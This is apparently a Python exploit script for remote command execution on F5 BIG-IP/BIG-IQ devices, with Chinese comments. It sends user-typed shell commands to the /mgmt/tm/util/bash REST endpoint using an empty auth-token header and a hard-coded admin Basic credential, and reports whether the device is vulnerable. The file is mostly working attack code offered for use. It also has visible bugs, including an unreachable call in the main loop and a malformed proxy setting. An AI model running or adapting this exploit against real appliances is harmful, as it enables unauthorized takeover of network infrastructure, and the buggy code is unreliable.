from socket import gethostbyname
import requests
from urllib3.exceptions import InsecureRequestWarning
import re
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
'''设置漏洞信息'''
proxy = {
    "127.0.0.1":1080
}
info= {
    "设备名称":"F5 BIG-IP/BIG-IQ",
    "漏洞类型":"远程代码执行",
    "CVE编号":"CVE-2021-22896"
}
def domain_to_ip(url):
    try:
        '''将域名转换成IP'''
        url = url.strip("/")
        # 判断是否为ip地址
        regular = re.compile('^((25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(25[0-5]|2[0-4]\d|[01]?\d\d?)$')
        if "://" in url:
            domain = url.split("://")[1].strip("/").split(":")[0]
            if regular.match(domain) == None:
                ip = gethostbyname(domain)
            else:
                ip = gethostbyname(domain)
        else:
            if regular.match(url) == None:
                ip = gethostbyname(url)
            else:
                ip = url
        return ip
    except:
        return None


def run(url,command):
    ip = domain_to_ip(url)
    headers = {
        "Host":ip.split(":")[0],
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:86.0) Gecko/20100101 Firefox/86.0",
        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "X-F5-Auth-Token":"",
        "Authorization":"Basic YWRtaW46QVNhc1M=",
        "Content-Length":"47",
        "Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding":"gzip, deflate",
        "Referer":"https://%s/tmui/login.jsp" % url.split("://")[1],
        "Upgrade-Insecure-Requests":"1"
    }
    data = {
        "command":"run",
        "utilCmdArgs":"-c %s" % command
    }
    if "://" in url:
        url = url.strip("/")+"/mgmt/tm/util/bash"
    else:
        url = "https://"+url.strip("/") + "/mgmt/tm/util/bash"
    print(url)
    print(headers)
    resp = requests.post(url=url,headers=headers,json=data,verify=False,proxies=proxy)
    if "commandResult" in resp.text:
        print("[+] CVE-2021-22896 漏洞存在 !")
    else:
        print("[X] CVE-2021-22896 漏洞不存在 ~")

    print(resp.text)


if __name__ == '__main__':
    while True:
        command = input(">>")
        if command in ['exit','quit']:
            exit(0)
            run("127.0.0.1",command)
